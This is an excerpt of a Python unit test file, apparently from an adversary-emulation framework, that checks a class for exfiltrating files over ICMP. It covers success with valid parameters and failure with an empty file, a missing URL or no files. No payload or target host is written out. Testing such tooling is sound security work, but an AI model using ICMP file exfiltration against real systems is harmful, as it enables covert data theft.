from ai_utils.phases.exfiltrate_files_over_icmp import ExfiltrateFilesOverIcmpPhaseClass
...
class TestExfiltrateFilesOverIcmpPhaseClass(unittest.TestCase):
    ...
    def test_valid_parameters(self):
        phase = ExfiltrateFilesOverIcmpPhaseClass(True, self.valid_exfiltration_url, self.valid_files_to_exfiltrate)
        success = phase.Execute()
        self.assertTrue(success)

    def test_exfil_with_empty_file(self):
        phase = ExfiltrateFilesOverIcmpPhaseClass(True, self.valid_exfiltration_url, [self.empty_file])
        success = phase.Execute()
        self.assertFalse(success)

    def test_without_exfil_url(self):
        phase = ExfiltrateFilesOverIcmpPhaseClass(True, '', self.valid_files_to_exfiltrate)
        success = phase.Execute()
        self.assertFalse(success)

    def test_without_exfil_files(self):
        phase = ExfiltrateFilesOverIcmpPhaseClass(True, self.valid_exfiltration_url, [])
        success = phase.Execute()
        self.assertFalse(success)
